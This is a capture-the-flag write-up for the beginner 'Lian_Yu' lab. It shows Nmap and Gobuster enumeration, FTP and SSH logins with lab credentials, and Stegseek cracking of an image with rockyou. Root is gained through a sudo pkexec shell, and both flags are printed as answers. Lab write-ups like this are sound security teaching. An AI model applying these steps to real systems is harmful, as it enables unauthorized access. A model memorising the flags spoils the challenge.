# Lian_Yu Writeup

> A beginner level security challenge.

---

## 🔍 Task 1: Web Directory

### Question
What is the Web Directory you found?

### Steps

- Scanned the target using Nmap:
```bash
nmap -sC -sV <IP>
```

- Open ports found:
  - 21 (FTP)
  - 22 (SSH)
  - 80 (HTTP)
  - 111 (RPC)

- Opened the website on port 80  
- Used Gobuster for directory enumeration:
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 150
```

- Found directory:
```
/island
```

- Checked source code → Found FTP username:
```
vigilante
```

- Increased threads for faster scanning (`-t 200`)  
- Found another directory:
```
/2100
```

- Used curl to inspect:
```bash
curl http://<IP>/2100
```

- Found file with `.ticket` extension  

### Answer
```
2100
```

---

## 🔍 Task 2: File Name Found

### Question
What is the file name you found?

### Steps

- Used Gobuster with extension:
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x ticket
```

- Found file:
```
green_arrow.ticket
```

- Used curl:
```bash
curl http://<IP>/2100/green_arrow.ticket
```

- Found encoded string → decoded to get FTP password  

### Answer
```
green_arrow.ticket
```

---

## 🔍 Task 3: FTP Password

### Question
What is the FTP password?

### Steps

- Encoded string found:
```
RTy8yhBQdscX
```

- Decoded → password:

### Answer
```
!#th3h00d
```

---

## 🔍 Task 4: SSH Password File

### Question
What is the file name with SSH password?

### Steps

- Logged into FTP:
```bash
ftp <IP>
```

Credentials:
```
vigilante:!#th3h00d
```

- Navigated directories:
```bash
cd ..
ls
```

- Found user:
```
slade
```

- Downloaded files:
```bash
mget .* *
```

- Found image:
```
aa.jpg
```

- Used Stegseek:
```bash
stegseek aa.jpg /usr/share/wordlists/rockyou.txt
```

- Extracted zip:
```
aa.jpg.out
```

- Unzipped:
```bash
unzip aa.jpg.out
```

- Found files:
```
password.txt
shado
```

- Found SSH password inside `shado`:
```
M3tahuman
```

### Answer
```
shado
```

---

## 🔍 Task 5: User Flag

### Question
user.txt ?

### Steps

- SSH login:
```bash
ssh slade@<IP>
```

Credentials:
```
M3tahuman
```

- Read flag:
```bash
cat user.txt
```

### Answer
```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

---

## 🔍 Task 6: Root Flag

### Question
root.txt ?

### Steps

- Check sudo permissions:
```bash
sudo -l
```

- Found:
```
/usr/bin/pkexec
```

- Escalate privileges:
```bash
sudo /usr/bin/pkexec /bin/sh
```

- Read root flag:
```bash
cat /root/root.txt
```

### Answer
```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

Report prepared by:  **zer0arc4**
